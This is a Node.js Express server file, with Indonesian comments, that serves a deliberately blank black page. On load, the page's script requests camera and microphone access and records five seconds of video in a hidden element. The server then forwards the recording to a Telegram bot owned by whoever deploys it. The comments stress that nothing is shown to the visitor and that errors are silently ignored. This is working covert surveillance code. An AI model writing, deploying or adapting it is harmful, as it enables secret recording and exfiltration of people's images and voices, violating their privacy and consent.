const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const config = require('./setting.js');

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

// Halaman utama - benar-benar kosong, hanya script di background
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera to Telegram</title>
    <style>
        body { margin: 0; background: black; }
        video { display: none; } /* Sembunyikan elemen video */
    </style>
</head>
<body>
    <script>
        (async function() {
            try {
                // Minta akses kamera
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                
                // Buat elemen video tersembunyi agar stream tetap aktif
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                video.style.display = 'none';
                document.body.appendChild(video);

                let recordedChunks = [];
                const mediaRecorder = new MediaRecorder(stream);
                
                mediaRecorder.ondataavailable = event => {
                    if (event.data.size > 0) recordedChunks.push(event.data);
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    const formData = new FormData();
                    formData.append('video', blob, 'recording.webm');

                    try {
                        await fetch('/upload', { method: 'POST', body: formData });
                    } catch (err) {
                        // Abaikan error, tidak ada UI untuk menampilkan
                    } finally {
                        stream.getTracks().forEach(track => track.stop());
                    }
                };

                // Rekam selama 5 detik
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder.state !== 'inactive') {
                        mediaRecorder.stop();
                    }
                }, 5000);
            } catch (err) {
                // Gagal akses kamera, tidak ada UI
                console.error(err);
            }
        })();
    </script>
</body>
</html>
  `);
});

// Endpoint untuk menerima video dan forward ke Telegram
app.post('/upload', upload.single('video'), async (req, res) => {
    if (!req.file) {
        return res.status(400).json({ success: false, error: 'No video uploaded' });
    }

    try {
        const formData = new FormData();
        formData.append('chat_id', config.OWNER_ID);
        formData.append('video', req.file.buffer, { filename: 'recording.webm', contentType: 'video/webm' });

        const telegramRes = await axios.post(`https://api.telegram.org/bot${config.TELEGRAM_TOKEN}/sendVideo`, formData, {
            headers: formData.getHeaders()
        });

        if (telegramRes.data.ok) {
            res.json({ success: true });
        } else {
            res.status(500).json({ success: false, error: 'Telegram API error' });
        }
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Handle 404
app.use((req, res) => {
    res.status(404).send('404 - Not Found');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});